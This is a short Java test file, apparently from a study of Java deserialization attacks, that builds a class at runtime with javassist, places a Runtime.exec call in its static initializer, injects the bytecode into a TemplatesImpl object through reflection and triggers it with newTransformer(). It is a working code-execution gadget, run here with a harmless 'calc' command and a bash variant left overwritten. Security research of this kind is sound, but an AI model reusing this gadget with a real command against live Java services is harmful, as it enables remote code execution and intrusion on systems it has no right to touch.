import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import util.ReflectionUtils;

public class ArrayTest {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Squirt1e");
        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"calc\"});";
        cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"calc\"});";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates =  new TemplatesImpl();
        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");
        ReflectionUtils.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        templates.newTransformer();

    }
}
